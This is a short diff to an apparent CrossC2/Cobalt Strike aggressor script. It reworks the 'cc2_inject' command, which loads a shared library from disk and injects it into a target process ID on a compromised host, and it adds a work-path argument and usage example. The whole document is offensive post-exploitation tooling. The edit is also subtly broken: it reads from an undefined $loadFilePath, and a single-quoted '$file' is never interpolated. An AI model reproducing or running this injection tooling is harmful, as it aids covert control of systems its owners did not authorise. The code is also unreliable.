@@ -62,18 +62,26 @@ sub bcc2_inject {
 }
 
 ssh_alias cc2_inject {
-    local('$bid $pid $file $temp_file_workpath');
+    local('$bid $pid $file $temp_file_workpath $handle $fileData');
     $bid = $1;
     $pid = $2;
     $file = $3;
+    if (-exists script_resource($3)) { 
+        $file = script_resource($3);
+    }
+    $handle = openf($loadFilePath);
+    $fileData = readb($handle, -1);
+    closef($handle);
+
+    $temp_file_workpath = $4;
     if ($temp_file_workpath eq $null) { 
         $temp_file_workpath = '/tmp/';
     }
     btask($bid, "RUN: cc2_inject ".$pid.' $file '.$temp_file_workpath);
-    bcc2_inject($bid, $pid, $file, $temp_file_workpath);
+    bcc2_inject($bid, $pid, $fileData, $temp_file_workpath);
 }
 
-ssh_command_register("cc2_inject", "CrossC2 process inject", "\nUsage: cc2_inject PID lib_file_path\n");
+ssh_command_register("cc2_inject", "CrossC2 process inject", "\nUsage: cc2_inject PID lib_file_path workpath\n\tcc2_inject 1524 c:\\libtest.so /tmp/\n");
 
 popup processbrowser {
     separator();
